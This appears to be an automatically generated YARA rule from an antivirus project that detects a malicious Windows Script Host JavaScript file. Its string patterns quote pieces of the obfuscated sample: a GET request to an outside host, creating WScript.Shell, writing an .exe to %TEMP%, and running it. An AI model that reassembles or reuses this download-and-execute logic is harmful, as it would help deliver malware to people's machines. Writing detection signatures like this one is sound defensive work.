rule sig_20160401_198dd3eeeb246db6a2a5463bac423d8c {
  meta:
    description = "datamaliciousorder - file 20160401_198dd3eeeb246db6a2a5463bac423d8c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e947ea1b2066f49c52a34e6c06a1edbc999f4e8f10ecf2f3f6e2a332e64b79c1"

  strings:
    $s1  = "TzNl[UjgJh](\"G\" + \"ET\", \"http://sirplusalot.net/l1pasw\", false);" fullword ascii
    $s2  = "function WevEw(XbXkz, VjVau){McmTbt = McmTbt * 1; return XbXkz - VjVau;};" fullword ascii
    $s3  = "var ZpKcv = function HfBl() {return WScript[GkdAge](\"WScript\"+\".Shell\");}(), NdLp = 11;" fullword ascii
    $s4  = "if (TzNl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function FusGp() {return ZpKcv[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vysJ4CbQ2.ex\" + \"e\";};" fullword ascii
    $s6  = "function WyhXy(){return RtQte + \"\";};" fullword ascii
    $s7  = "function LgcGqh() {return ((LdaHl == true) && (LdaHl == SkEnt)) ? 1 : McmTbt;};" fullword ascii
    $s8  = "SkEnt = true; " fullword ascii
    $s9  = "var NrNml = new this[\"Date\"]();" fullword ascii
    $s10 = "var LdaHl = false;" fullword ascii
    $s11 = "var SkEnt = false;" fullword ascii
    $s12 = "var VurIrj = false;" fullword ascii
    $s13 = "LdaHl = true; " fullword ascii
    $s14 = "function OirSnz(CwGg){ZpKcv[\"R\"+\"un\"](CwGg, McmTbt, McmTbt);};" fullword ascii
    $s15 = "function AxiCwn(){return GkdAge;};" fullword ascii
    $s16 = "return WevEw(SaoYk, IoqLj);" fullword ascii
    $s17 = "function GmHa(JjaNhs) {var HniDz = (1, 2, 3, 4, 5, JjaNhs); return HniDz;};" fullword ascii
    $s18 = "function TgpLkd()" fullword ascii
    $s19 = "}while (OxlMee);" fullword ascii
    $s20 = "function RodHci(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}